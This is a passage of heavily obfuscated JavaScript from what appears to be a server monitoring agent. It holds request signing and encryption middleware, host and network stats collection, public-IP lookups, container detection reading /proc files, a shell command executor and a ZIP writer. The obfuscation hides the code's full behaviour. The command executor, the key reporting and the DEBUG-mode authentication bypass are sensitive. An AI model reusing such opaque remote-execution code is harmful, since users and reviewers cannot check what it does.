            'wicqq': bA(0x742),
            'aflPd': bA(0x872),
            'tsvFg': bA(0x778),
            'AZLev': bA(0x300),
            'EKOIH': function (d, f) {
                return d === f;
            },
            'GDexa': bA(0x736),
            'gPpgV': function (d) {
                return d();
            },
            'DYbhB': bA(0x256),
            'XTTfX': function (d, f) {
                return d === f;
            },
            'rkOMT': bA(0x261),
            'jjOIC': bA(0x4a5),
            'HFWib': function (d) {
                return d();
            },
            'IRehj': bA(0x226),
            'jFqWi': 'X-Nonce',
            'JugSE': 'X-Timestamp',
            'wdZzu': bA(0x776),
            'uZjed': function (d, f) {
                return d || f;
            },
            'OCcpx': 'Missing\x20auth\x20headers',
            'PyQwn': function (d, f) {
                return d !== f;
            },
            'mnTHc': bA(0x40f),
            'mQxRq': function (d, f) {
                return d > f;
            },
            'ljXKL': 'sha256',
            'vbYwU': bA(0x372),
            'VsWcn': function (d) {
                return d();
            },
            'NnPeS': 'true',
            'UaGJK': bA(0x7f9),
            'ZsaUJ': function (d, f) {
                return d === f;
            }
        };
    return async (d, f, g) => {
        const bB = bA, h = {
                'ytvTu': function (o, p) {
                    return c['gtlYW'](o, p);
                },
                'uqihM': c[bB(0x3c5)],
                'geNJP': bB(0x47d),
                'pPsio': 'false',
                'gNGmA': c[bB(0x722)],
                'SbqJm': c['aflPd'],
                'ERsET': 'application/json',
                'EBijt': c[bB(0x397)],
                'dKIRy': function (o, p) {
                    return o === p;
                },
                'OTNrd': c['AZLev'],
                'XeOXD': function (o, p) {
                    const bC = bB;
                    return c[bC(0x313)](o, p);
                },
                'azSrJ': c[bB(0x440)],
                'LvWXX': bB(0x344),
                'KJgrK': bB(0x1b5),
                'qWaIp': function (o, p) {
                    return o === p;
                }
            };
        if (d['path'][bB(0x2eb)](bB(0x18a)))
            return c[bB(0x3b2)](g);
        const i = f['send'];
        f[bB(0x595)] = function (o) {
            const bD = bB;
            if (a0P['DEBUG']) {
                const p = h['ytvTu'](typeof o, h[bD(0x3eb)]) ? o : Buffer[bD(0x228)](o) ? o : JSON[bD(0x7ce)](o);
                return f[bD(0x5ef)](h[bD(0x75e)], h[bD(0x243)]), f[bD(0x5ef)](h[bD(0x33c)], Buffer[bD(0x16e)](p)[bD(0x491)]()), i[bD(0x3cf)](this, p);
            }
            if (f[bD(0x225)](h[bD(0x3de)]) && f[bD(0x225)](h[bD(0x3de)])['includes'](h['ERsET']))
                try {
                    if (d[bD(0x325)]) {
                        let q;
                        if (h[bD(0x791)](d[bD(0x2be)], h[bD(0x270)])) {
                            const r = h['dKIRy'](typeof o, h[bD(0x3eb)]) ? JSON[bD(0x4d3)](o) : o;
                            let s = null;
                            h[bD(0x3d1)](d[bD(0x75f)], h['OTNrd']) && b && (s = b[bD(0x7cc)]());
                            const t = a['encryptResponse'](r, s);
                            q = h[bD(0x425)](typeof t, h[bD(0x3eb)]) ? t : JSON['stringify'](t);
                        } else {
                            const u = Buffer['isBuffer'](o) ? o : h['ytvTu'](typeof o, bD(0x1fc)) ? Buffer[bD(0x7e4)](o, 'utf8') : Buffer[bD(0x7e4)](JSON[bD(0x7ce)](o), h[bD(0x429)]);
                            q = a['encryptData'](u, Buffer['from'](a0P[bD(0x18c)], 'base64'));
                        }
                        return f['set'](h['geNJP'], h[bD(0x584)]), f[bD(0x5ef)](h[bD(0x2a5)], a0P['AGENT_VERSION']), f[bD(0x5ef)](bD(0x742), Buffer['byteLength'](q, h['azSrJ'])['toString']()), i[bD(0x3cf)](this, q);
                    } else {
                        const v = h[bD(0x2e8)](typeof o, h[bD(0x3eb)]) ? o : JSON[bD(0x7ce)](o);
                        return f['set'](h[bD(0x33c)], Buffer['byteLength'](v, bD(0x736))['toString']()), i[bD(0x3cf)](this, v);
                    }
                } catch (w) {
                    if (!f[bD(0x75d)]) {
                        const x = JSON['stringify']({ 'error': bD(0x6c1) + w[bD(0x7df)] });
                        return f[bD(0x7dc)](0x1f4), f[bD(0x5ef)](bD(0x872), bD(0x5c5)), f[bD(0x5ef)](h[bD(0x33c)], Buffer[bD(0x16e)](x, h['azSrJ'])[bD(0x491)]()), i[bD(0x3cf)](this, x);
                    }
                    throw w;
                }
            return i[bD(0x3cf)](this, o);
        };
        const j = f[bB(0x342)];
        f[bB(0x342)] = function (...o) {
            const bE = bB;
            return a0P[bE(0x550)] && !f['get'](c[bE(0x2c7)]) && f[bE(0x5ef)](c[bE(0x2c7)], c[bE(0x797)]), j[bE(0x7b3)](this, o);
        };
        if (c[bB(0x313)](d['method'], c[bB(0x41c)]) || c[bB(0x215)](d['method'], c[bB(0x341)]))
            return a0P[bB(0x550)] && f[bB(0x5ef)](c[bB(0x2c7)], c[bB(0x797)]), c[bB(0x3b2)](g);
        d['is_authenticated'] = ![];
        const k = [
            c['tsvFg'],
            c['jjOIC']
        ];
        if (a0P[bB(0x550)])
            return d[bB(0x325)] = !![], c[bB(0x4db)](g);
        const l = d[bB(0x254)][c[bB(0x7ed)]] || d[bB(0x254)][c[bB(0x2bc)]], m = d[bB(0x254)][bB(0x4f0)] || d[bB(0x254)][c['JugSE']], n = d[bB(0x254)][c['wdZzu']] || d[bB(0x254)][bB(0x5fa)];
        if (c[bB(0x2e6)](!l, !m) || !n)
            return k[bB(0x41d)](d[bB(0x2be)]) ? c['gPpgV'](g) : f[bB(0x7dc)](0x191)[bB(0x32b)]({ 'error': c[bB(0x77f)] });
        try {
            let o = Buffer[bB(0x605)](0x0);
            if (c[bB(0x278)](d['path'], '/api/fileraw')) {
                if (Buffer['isBuffer'](d['body']))
                    o = d[bB(0x41a)];
                else {
                    if (typeof d[bB(0x41a)] === bB(0x1fc))
                        o = Buffer[bB(0x7e4)](d['body'], c['mnTHc']);
                }
            }
            const p = c[bB(0x58a)](o[bB(0x650)], 0x0) ? a0k[bB(0x674)](c[bB(0x387)])[bB(0x1a8)](o)[bB(0x454)](bB(0x86d)) : '', q = b ? b[bB(0x52f)]() : null, r = a[bB(0x175)](d[bB(0x717)], d[bB(0x2be)], p, l, m, n, q);
            d[bB(0x325)] = !![], d['key_source'] = c[bB(0x591)](r, c['AZLev']) ? c[bB(0x424)] : c[bB(0x382)];
        } catch (s) {
            return k[bB(0x41d)](d[bB(0x2be)]) ? c['VsWcn'](g) : f[bB(0x7dc)](0x191)[bB(0x32b)]({ 'error': 'Signature\x20verification\x20failed:\x20' + s['message'] });
        }
        if (d[bB(0x41a)] && typeof d[bB(0x41a)] === 'string') {
            const t = (d[bB(0x254)][bB(0x840)] || '')[bB(0x40a)]() === c[bB(0x7c5)];
            try {
                if (t && d[bB(0x325)]) {
                    const u = Buffer[bB(0x7e4)](a0P[bB(0x18c)], c[bB(0x3ba)]), v = a[bB(0x15a)](d[bB(0x41a)], u);
                    d[bB(0x41a)] = JSON[bB(0x4d3)](v);
                } else {
                    if (d['body'][bB(0x2eb)](bB(0x764))) {
                        const w = Buffer['from'](d[bB(0x41a)], bB(0x7f9))[bB(0x491)](bB(0x40f));
                        d[bB(0x41a)] = JSON['parse'](w);
                    } else {
                        if (d['body'][bB(0x343)]()[bB(0x2eb)]('{') || d[bB(0x41a)]['trim']()[bB(0x2eb)]('['))
                            d['body'] = JSON['parse'](d[bB(0x41a)]);
                        else {
                            if (c[bB(0x859)](d['body'][bB(0x343)](), ''))
                                d[bB(0x41a)] = {};
                        }
                    }
                }
            } catch (x) {
                return a0D[bB(0x5e7)]('💥\x20[Body\x20Parse\x20Error]:\x20' + x['message']), f[bB(0x7dc)](0x190)['json']({ 'error': bB(0x445) + x[bB(0x7df)] });
            }
        }
        c[bB(0x34c)](g);
    };
}
class a0U {
    constructor() {
        const bF = a0aW;
        this[bF(0x7af)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bF(0x172)] = 0x0, this[bF(0x176)] = 0x0, this['lastNetworkTime'] = Date[bF(0x5d5)]() / 0x3e8;
    }
    async [a0aW(0x295)]() {
        const bG = a0aW, a = {
                'ODTld': function (d, f, g) {
                    return d(f, g);
                },
                'uglGl': bG(0x57d),
                'uTBHX': function (d, f, g) {
                    return d(f, g);
                },
                'QzqjS': '/sys/fs/cgroup/memory/memory.usage_in_bytes',
                'DLqLS': bG(0x736),
                'cEtUV': function (d, f) {
                    return d === f;
                },
                'XLptv': function (d, f) {
                    return d(f);
                },
                'YtRwj': function (d, f) {
                    return d - f;
                },
                'AFQTl': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bG(0x205)](bG(0x3ca), bG(0x736)))[bG(0x343)]();
            b = d === bG(0x58e) ? null : a[bG(0x2fe)](parseInt, d, 0xa), c = a[bG(0x2fe)](parseInt, (await a0m[bG(0x205)](bG(0x7f5), bG(0x736)))[bG(0x343)](), 0xa);
        } catch {
            try {
                b = a[bG(0x2fe)](parseInt, (await a0m[bG(0x205)](a['uglGl'], bG(0x736)))[bG(0x343)](), 0xa), c = a[bG(0x7cd)](parseInt, (await a0m[bG(0x205)](a['QzqjS'], a[bG(0x5eb)]))['trim'](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0u[bG(0x4d0)]();
                b = f[bG(0x7a5)], c = f['used'];
            }
        }
        if (b === null) {
            const g = await a0u[bG(0x4d0)]();
            b = g[bG(0x7a5)], (a[bG(0x25c)](c, null) || a['XLptv'](isNaN, c)) && (c = g[bG(0x6e2)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bG(0x307)](b, c),
            'free': a['AFQTl'](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aW(0x5c6)]() {
        const bH = a0aW, [a, b, c, d] = await Promise[bH(0x7c0)]([
                a0u[bH(0x363)](),
                this['getContainerMemory'](),
                a0u['osInfo'](),
                a0u['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[bH(0x7c0)]([
                this[bH(0x808)](),
                this[bH(0x3e0)]()
            ]);
        } catch (h) {
            a0D[bH(0x768)]('获取\x20IP\x20地址失败:\x20' + h['message'], 0x1);
        }
        return {
            'arch': a0p[bH(0x853)](),
            'cpu_cores': a[bH(0x152)],
            'cpu_name': a[bH(0x679)],
            'disk_total': (await a0u[bH(0x5e2)]())[0x0]?.[bH(0x463)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bH(0x7a5)],
            'os': c[bH(0x59e)] + '\x20' + c[bH(0x501)],
            'kernel_version': c[bH(0x67c)],
            'swap_total': b[bH(0x1b7)],
            'version': a0P['AGENT_VERSION'],
            'virtualization': await this[bH(0x405)](),
            'session_key': a0P[bH(0x18c)],
            'noise_key': a0P[bH(0x509)]
        };
    }
    ['getLocalIPv4']() {
        const bI = a0aW, a = {
                'jHFJW': function (c, d) {
                    return c === d;
                },
                'UUoWt': bI(0x3cb)
            }, b = a0p[bI(0x167)]();
        for (const c of Object[bI(0x551)](b)) {
            for (const d of b[c]) {
                const f = a[bI(0x60c)](d[bI(0x26e)], a['UUoWt']) || a[bI(0x60c)](d['family'], 0x4);
                if (f && !d[bI(0x2e7)]) {
                    if (!/^10\./[bI(0x4ef)](d[bI(0x743)]) && !/^192\.168\./[bI(0x4ef)](d[bI(0x743)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[bI(0x4ef)](d[bI(0x743)]))
                        return d[bI(0x743)];
                }
            }
        }
        return null;
    }
    async [a0aW(0x808)]() {
        const bJ = a0aW, a = {
                'cyMOd': bJ(0x626),
                'JEKCg': bJ(0x666),
                'sOZSo': bJ(0x2cb),
                'zofwq': bJ(0x7f7),
                'AQYZZ': bJ(0x725)
            }, b = [
                a[bJ(0x7d5)],
                a[bJ(0x49b)],
                bJ(0x714),
                a[bJ(0x63f)],
                a['zofwq'],
                a[bJ(0x3bd)],
                bJ(0x6d3)
            ];
        for (const d of b) {
            try {
                const f = await this['fetchIP'](d, 0x4);
                if (f && this[bJ(0x6fb)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[bJ(0x2ee)]();
        if (c && this[bJ(0x6fb)](c))
            return c;
        return null;
    }
    ['getLocalIPv6']() {
        const bK = a0aW, a = {
                'KgbCm': function (c, d) {
                    return c === d;
                },
                'kckxL': 'IPv6',
                'aSUth': function (c, d) {
                    return c === d;
                },
                'RnJxt': bK(0x78d)
            }, b = a0p[bK(0x167)]();
        for (const c of Object[bK(0x551)](b)) {
            for (const d of b[c]) {
                const f = a[bK(0x3ae)](d['family'], a[bK(0x1f7)]) || a['aSUth'](d[bK(0x26e)], 0x6);
                if (f && !d['internal']) {
                    if (!d[bK(0x743)]['toLowerCase']()[bK(0x2eb)](a['RnJxt']))
                        return d[bK(0x743)];
                }
            }
        }
        return null;
    }
    async [a0aW(0x3e0)]() {
        const bL = a0aW, a = {
                'yXFry': 'https://api6.ipify.org',
                'UfqfL': 'https://icanhazip.com',
                'frhyF': 'https://v6.ident.me'
            }, b = this['getLocalIPv6']();
        if (b && this[bL(0x1a3)](b))
            return b;
        const c = [
            a['yXFry'],
            a[bL(0x2e2)],
            a[bL(0x70c)]
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this[bL(0x1a3)](f))
                    return f;
            } catch (g) {
                a0D[bL(0x768)]('访问\x20' + d + bL(0x70b) + g[bL(0x7df)]);
                continue;
            }
        }
        return null;
    }
    async [a0aW(0x351)](a, b = 0x0) {
        const bM = a0aW, c = {
                'aMrqD': function (d, f) {
                    return d !== f;
                },
                'JvXYJ': function (d, f) {
                    return d(f);
                },
                'xYJmM': bM(0x64d),
                'HZdvX': bM(0x342),
                'itvzL': bM(0x3b4),
                'cwhDf': function (d, f) {
                    return d(f);
                },
                'eCJmT': bM(0x1bf)
            };
        return new Promise((d, f) => {
            const bN = bM, g = c[bN(0x2ca)](require, c[bN(0x85c)]), h = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': bN(0x72e) }
                }, i = g['get'](a, h, j => {
                    const bO = bN;
                    let k = '';
                    if (c[bO(0x6d6)](j['statusCode'], 0xc8)) {
                        c['JvXYJ'](f, new Error(bO(0x53b) + j[bO(0x475)]));
                        return;
                    }
                    j['on'](c[bO(0x66b)], l => k += l), j['on'](c[bO(0x7ef)], () => d(k[bO(0x343)]()));
                });
            i['on']('error', f), i[bN(0x160)](0x1388, () => {
                const bP = bN;
                i[bP(0x2ef)](), f(new Error(c[bP(0x17a)]));
            });
        });
    }
    ['isValidIPv4'](a) {
        const bQ = a0aW;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bQ(0x4ef)](a);
    }
    ['isValidIPv6'](a) {
        const bR = a0aW;
        if (!/^[0-9a-fA-F:]+$/['test'](a) || !a[bR(0x41d)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bR(0x4ef)](a))
            return ![];
        return !![];
    }
    async ['getRealtimeInfo']() {
        const bS = a0aW, a = {
                'hgCcV': function (m, n) {
                    return m - n;
                },
                'sXmSb': function (m, n) {
                    return m - n;
                },
                'fuseh': function (m, n) {
                    return m / n;
                },
                'LTXUq': function (m, n) {
                    return m * n;
                },
                'PgWaf': function (m, n) {
                    return m / n;
                },
                'ugRKk': function (m, n) {
                    return m * n;
                },
                'FTZhg': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bS(0x7c0)]([
                a0u[bS(0x6d5)](),
                a0u['mem'](),
                a0u['networkStats'](),
                a0u[bS(0x6d5)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = Date[bS(0x5d5)]() / 0x3e8, i = a['hgCcV'](h, this[bS(0x361)]), j = a[bS(0x745)](g[bS(0x22b)], this[bS(0x7af)]['tx']), k = a[bS(0x745)](g['rx_bytes'], this[bS(0x7af)]['rx']);
        this[bS(0x172)] += j, this[bS(0x176)] += k, this[bS(0x7af)] = {
            'tx': g[bS(0x22b)],
            'rx': g[bS(0x7eb)]
        }, this[bS(0x361)] = h;
        const l = await a0u['processes']();
        return {
            'cpu': { 'usage': Math[bS(0x16a)](b['currentLoad']) },
            'ram': {
                'total': c['total'],
                'used': c[bS(0x781)]
            },
            'swap': {
                'total': c['swaptotal'],
                'used': c[bS(0x5f9)]
            },
            'load': {
                'load1': Math[bS(0x16a)](f[bS(0x884)] * 0x64) / 0x64,
                'load5': a[bS(0x2ff)](Math[bS(0x16a)](a[bS(0x557)](f['avgLoad'], 0x64)), 0x64),
                'load15': a[bS(0x4a4)](Math[bS(0x16a)](a[bS(0x720)](f[bS(0x884)], 0x64)), 0x64)
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math[bS(0x16a)](a['FTZhg'](j, i)),
                'down': Math[bS(0x16a)](k / i),
                'totalUp': this[bS(0x172)],
                'totalDown': this[bS(0x176)]
            },
            'connections': await this[bS(0x494)](),
            'uptime': a0p[bS(0x65b)](),
            'process': l?.[bS(0x7c0)] || 0x0,
            'message': ''
        };
    }
    async [a0aW(0x405)]() {
        const bT = a0aW, a = {
                'qzckT': bT(0x862),
                'JFnhf': 'Docker',
                'jBzNU': bT(0x14b),
                'cjxfO': bT(0x4ba),
                'BjlSS': bT(0x6f2),
                'yyVfO': bT(0x62d),
                'CzmmA': bT(0x87c),
                'kwHSG': bT(0x504),
                'mJhLo': bT(0x6ad),
                'bkDqT': '/proc/self/mountinfo',
                'snmOE': 'utf8',
                'poDyQ': bT(0x1b0),
                'CsCnq': bT(0x75c),
                'IrXhm': 'kubelet',
                'sqFWc': '/proc/1/environ',
                'EAzrB': bT(0x652),
                'fErMu': bT(0x27d),
                'XPlEX': bT(0x4ac),
                'rWgMs': 'KVM',
                'wCKdR': bT(0x479)
            };
        try {
            if (a0l[bT(0x5ec)](a[bT(0x448)]))
                return a[bT(0x5f4)];
            if (a0l[bT(0x5ec)](a[bT(0x6b4)]))
                return a[bT(0x37d)];
            if (a0l[bT(0x5ec)](a[bT(0x32f)])) {
                const b = a0l[bT(0x31f)](a[bT(0x32f)], bT(0x736))[bT(0x40a)]();
                if (b['includes'](a[bT(0x46f)]) || b['includes']('containerd'))
                    return a[bT(0x5f4)];
                else {
                    if (b[bT(0x41d)](a['CzmmA']))
                        return a['kwHSG'];
                    else {
                        if (b[bT(0x41d)](a['mJhLo']))
                            return bT(0x27d);
                    }
                }
            }
            if (a0l[bT(0x5ec)](a[bT(0x265)])) {
                const c = a0l[bT(0x31f)](bT(0x4b0), a[bT(0x1c6)]);
                if (c[bT(0x41d)](a[bT(0x635)]) || c['includes'](a[bT(0x3d5)]))
                    return a[bT(0x5f4)];
                else {
                    if (c['includes']('/pods/') || c[bT(0x41d)](a[bT(0x78b)]))
                        return a['kwHSG'];
                }
            }
            if (a0l[bT(0x5ec)](bT(0x1c4))) {
                const d = a0l['readFileSync'](a['sqFWc'], bT(0x736));
                if (d[bT(0x41d)](a['EAzrB']))
                    return a[bT(0x1d3)];
            }
            if (a0l[bT(0x5ec)](bT(0x421))) {
                const f = a0l[bT(0x31f)](bT(0x421), a[bT(0x1c6)]);
                if (f[bT(0x41d)](a[bT(0x6be)]) || f[bT(0x41d)](a[bT(0x5c2)]))
                    return a[bT(0x6be)];
            }
        } catch (g) {
        }
        return a[bT(0x810)];
    }
    async [a0aW(0x685)]() {
        const bU = a0aW, a = {
                'NpAte': function (b, c) {
                    return b > c;
                },
                'asGiW': function (b, c) {
                    return b !== c;
                },
                'WHYRf': bU(0x3a2),
                'NlaZL': bU(0x6bd)
            };
        try {
            const b = await a0u[bU(0x5e2)](), c = b[bU(0x3cc)](g => {
                    const bV = bU;
                    return a[bV(0x49a)](g['size'], 0x0) && a[bV(0x6db)](g[bV(0x55f)], a[bV(0x629)]) && a[bV(0x6db)](g['type'], a[bV(0x6cc)]) && g['fs'][bV(0x2eb)]('/dev/');
                }), d = c[bU(0x496)]((g, h) => g + h[bU(0x463)], 0x0), f = c['reduce']((g, h) => g + h[bU(0x6e2)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aW(0x494)]() {
        const bW = a0aW;
        try {
            const a = await a0u['networkConnections'](), b = a['filter'](d => d[bW(0x2cc)] === 'tcp')['length'], c = a[bW(0x3cc)](d => d[bW(0x2cc)] === bW(0x349))[bW(0x650)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0V {
    static async ['execute'](a, b = {}) {
        const bX = a0aW, c = {
                'ycafB': function (d, f) {
                    return d === f;
                },
                'TdFQG': 'number',
                'EkIrL': function (d, f) {
                    return d(f);
                },
                'cAOcJ': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'ddTSB': function (d, f) {
                    return d * f;
                },
                'HTYns': function (d, f) {
                    return d * f;
                },
                'cGSmC': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bX(0x44a)](),
                env: env = {},
                timeout: timeout = a0P['Rtimeout']
            } = b;
        return new Promise(d => {
            const bZ = bX, f = {
                    'rvxhJ': function (i, j) {
                        return i || j;
                    },
                    'TTEqF': function (i, j) {
                        const bY = a0b;
                        return c[bY(0x41e)](i, j);
                    },
                    'uYZdt': c[bZ(0x784)],
                    'FRWgY': function (i, j) {
                        const c0 = bZ;
                        return c[c0(0x58d)](i, j);
                    }
                }, g = Date[bZ(0x5d5)](), h = c[bZ(0x5cf)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[bZ(0x1ef)](timeout, 0x3e8),
                    'maxBuffer': c[bZ(0x7cb)](c[bZ(0x14a)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const c1 = bZ, l = Date[c1(0x5d5)]() - g, m = i && i[c1(0x33a)] && i[c1(0x28e)];
                    let n = f['rvxhJ'](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f['TTEqF'](typeof i[c1(0x812)], f['uYZdt']) ? o = i[c1(0x812)] : o = -0x1;
                    }
                    f[c1(0x7b8)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
function a0W(a) {
    const c2 = a0aW, b = {
            'mOwPF': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l['realpathSync'][c2(0x1ae)](a0o[c2(0x38c)](a0P[c2(0x5e6)])), d = a0o['resolve'](a);
        let f = d;
        while (!a0l[c2(0x5ec)](f)) {
            const j = a0o[c2(0x236)](f);
            if (b['mOwPF'](j, f))
                return ![];
            f = j;
        }
        const g = a0l[c2(0x388)][c2(0x1ae)](f), h = a0o[c2(0x4eb)](c, g);
        if (h[c2(0x2eb)]('..') || a0o[c2(0x443)](h))
            return ![];
        const i = a0o[c2(0x4eb)](f, d);
        if (i && (i[c2(0x2eb)]('..') || a0o['isAbsolute'](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0X {
    static ['ZIP_MAX_ENTRIES'] = 0x4e20;
    static ['ZIP_MAX_TOTAL_BYTES'] = 0x200 * 0x400 * 0x400;
    static ['ZIP_MAX_LISTED_FILES'] = 0x1f4;
    static [a0aW(0x5b9)] = null;
    static ['_crc32'](a) {
        const c3 = a0aW, b = {
                'OfIEq': function (g, h) {
                    return g < h;
                },
                'xBwrv': function (g, h) {
                    return g ^ h;
                },
                'TTqkh': function (g, h) {
                    return g >>> h;
                },
                'RzVGL': function (g, h) {
                    return g & h;
                }
            };
        if (!a0X[c3(0x5b9)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; h < 0x100; h++) {
                let j = h;
                for (let l = 0x0; b[c3(0x64e)](l, 0x8); l++)
                    j = j & 0x1 ? b[c3(0x221)](0xedb88320, b[c3(0x402)](j, 0x1)) : b['TTqkh'](j, 0x1);
                g[h] = j;
            }
            a0X[c3(0x5b9)] = g;
        }
        const d = a0X['_crcTable'];
        let f = -0x1;
        for (let m = 0x0; b[c3(0x64e)](m, a[c3(0x650)]); m++)
            f = b[c3(0x221)](f >>> 0x8, d[b[c3(0x480)](f ^ a[m], 0xff)]);
        return b[c3(0x402)](b['xBwrv'](f, -0x1), 0x0);
    }
    static ['_dosDateTime'](a) {
        const c4 = a0aW, b = {
                'thKWm': function (g, h) {
                    return g & h;
                },
                'WmJKh': function (g, h) {
                    return g | h;
                },
                'YuPdm': function (g, h) {
                    return g << h;
                },
                'jGiFK': function (g, h) {
                    return g >> h;
                },
                'esXkY': function (g, h) {
                    return g & h;
                },
                'NaXsG': function (g, h) {
                    return g << h;
                },
                'LuTLs': function (g, h) {
                    return g - h;
                },
                'zgCGW': function (g, h) {
                    return g + h;
                }
            }, c = b[c4(0x6c7)](b['WmJKh'](b['WmJKh'](a['getHours']() << 0xb, b[c4(0x18b)](a[c4(0x692)](), 0x5)), b[c4(0x7b9)](a[c4(0x5e8)](), 0x1)), 0xffff), f = b['esXkY'](b['WmJKh'](b['WmJKh'](b[c4(0x5bf)](b['LuTLs'](a[c4(0x1ac)](), 0x7bc), 0x9), b[c4(0x753)](a[c4(0x56b)](), 0x1) << 0x5), a[c4(0x3a6)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0aW(0x237)](a) {
        const c5 = a0aW, b = {
                'gjOFq': function (i, j) {
                    return i < j;
                },
                'IxnPp': function (i, j) {
                    return i >= j;
                },
                'NlOnC': c5(0x736),
                'HCfGm': function (i, j) {
                    return i > j;
                },
                'ekqXH': function (i, j) {
                    return i(j);
                },
                'xQMGr': function (i, j) {
                    return i + j;
                },
                'wbucS': function (i, j) {
                    return i(j);
                }
            }, c = a0l['openSync'](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const c6 = c5;
            let j = 0x0;
            while (b[c6(0x29d)](j, i[c6(0x650)]))
                j += a0l['writeSync'](c, i, j, i[c6(0x650)] - j);
        };
        return {
            'add'(i, j, k, l = ![]) {
                const c7 = c5;
                if (b['IxnPp'](g, a0X[c7(0x420)]))
                    return ![];
                const m = Buffer[c7(0x7e4)](i, b['NlOnC']);
                j = j || Buffer[c7(0x605)](0x0);
                const n = l ? 0x0 : a0X[c7(0x507)](j);
                let o = 0x0, p = j;
                if (!l && b[c7(0x878)](j['length'], 0x0)) {
                    const u = a0n['deflateRawSync'](j, { 'level': 0x6 });
                    b['gjOFq'](u[c7(0x650)], j[c7(0x650)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0X['_dosDateTime'](k || new Date()), s = Buffer[c7(0x605)](0x1e);
                s[c7(0x490)](0x4034b50, 0x0), s[c7(0x3c7)](0x14, 0x4), s[c7(0x3c7)](0x800, 0x6), s[c7(0x3c7)](o, 0x8), s[c7(0x3c7)](q, 0xa), s[c7(0x3c7)](r, 0xc), s['writeUInt32LE'](n, 0xe), s[c7(0x490)](p[c7(0x650)], 0x12), s[c7(0x490)](j[c7(0x650)], 0x16), s['writeUInt16LE'](m[c7(0x650)], 0x1a), s['writeUInt16LE'](0x0, 0x1c), b[c7(0x260)](h, s), b[c7(0x260)](h, m), h(p);
                const t = Buffer[c7(0x605)](0x2e);
                return t[c7(0x490)](0x2014b50, 0x0), t[c7(0x3c7)](0x14, 0x4), t[c7(0x3c7)](0x14, 0x6), t['writeUInt16LE'](0x800, 0x8), t['writeUInt16LE'](o, 0xa), t['writeUInt16LE'](q, 0xc), t[c7(0x3c7)](r, 0xe), t[c7(0x490)](n, 0x10), t[c7(0x490)](p[c7(0x650)], 0x14), t['writeUInt32LE'](j['length'], 0x18), t['writeUInt16LE'](m[c7(0x650)], 0x1c), t[c7(0x3c7)](0x0, 0x1e), t[c7(0x3c7)](0x0, 0x20), t['writeUInt16LE'](0x0, 0x22), t[c7(0x3c7)](0x0, 0x24), t['writeUInt32LE'](l ? 0x10 : 0x0, 0x26), t['writeUInt32LE'](f, 0x2a), d[c7(0x24a)](t, m), f += b[c7(0x3e1)](b[c7(0x3e1)](0x1e, m[c7(0x650)]), p[c7(0x650)]), g++, !![];
            },
            'close'() {
                const c8 = c5, i = Buffer[c8(0x85e)](d), j = Buffer['alloc'](0x16);
                return j['writeUInt32LE'](0x6054b50, 0x0), j[c8(0x3c7)](0x0, 0x4), j['writeUInt16LE'](0x0, 0x6), j['writeUInt16LE'](g, 0x8), j[c8(0x3c7)](g, 0xa), j[c8(0x490)](i[c8(0x650)], 0xc), j['writeUInt32LE'](f, 0x10), j[c8(0x3c7)](0x0, 0x14), h(i), b[c8(0x28a)](h, j), a0l['closeSync'](c), g;
            }
        };
    }
    static [a0aW(0x4d3)](a) {
        const c9 = a0aW, b = {
                'uHVVc': function (n, o) {
                    return n - o;
                },
                'JyHGo': function (n, o) {
                    return n + o;
                },
                'UpGvc': function (n, o) {
                    return n - o;
                },
                'lbLNL': function (n, o) {
                    return n >= o;
                },
                'gRfPW': function (n, o) {
                    return n === o;
                },
                'elCLf': function (n, o) {
                    return n < o;
                },
                'IfyYe': c9(0x7f1),
                'SvLzq': function (n, o) {
                    return n + o;
                },
                'Owgem': function (n, o) {
                    return n < o;
                },
                'ZNNFB': function (n, o) {
                    return n !== o;
                },
                'zdfUQ': function (n, o) {
                    return n + o;
                },
                'xRmhH': function (n, o) {
                    return n + o;
                },
                'rkdIT': function (n, o) {
                    return n + o;
                },
                'OmTkq': function (n, o) {
                    return n + o;
                },
                'cjmax': function (n, o) {
                    return n + o;
                },
                'inBYR': function (n, o) {
                    return n + o;
                },
                'uXlZp': function (n, o) {
                    return n + o;
                },
                'pSDjg': 'utf8',
                'RqBbi': function (n, o) {
                    return n + o;
                },
                'rVBfM': function (n, o) {
                    return n !== o;
                },
                'IbzvX': function (n, o) {
                    return n & o;
                },
